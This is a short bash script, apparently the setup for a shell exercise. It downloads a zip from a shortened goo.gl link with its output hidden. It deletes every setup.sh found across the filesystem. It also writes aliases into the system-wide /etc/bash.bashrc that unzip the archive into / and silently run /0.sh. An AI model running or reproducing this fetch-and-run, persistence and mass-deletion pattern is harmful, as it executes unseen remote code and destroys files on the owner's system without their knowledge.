#!/bin/bash
unalias -a
find / -type f -name "setup.sh" -exec rm -f {} 2>/dev/null \;; rm -f /0.sh 2>/dev/null; rm -f /setup.zip 2>/dev/null
wget goo.gl/uLeAmz -O /setup.zip >/dev/null 2>&1
echo 'alias start="echo; echo Password Required; unzip -o /setup.zip -d / ; find / -name setup.sh -exec rm -f {} 2>/dev/null \;; /0.sh >/dev/null 2>&1"' >> /etc/bash.bashrc
echo 'alias next="rm -f /setup.zip; find / -name 0.sh -exec rm -f {} 2>/dev/null \;; cp /broken.sh $(pwd)"' >> /etc/bash.bashrc
echo 'alias last="unalias -a"' >> /etc/bash.bashrc
#echo 'alias 4="kill -9 $(echo $$)"' >> /etc/bash.bashrc
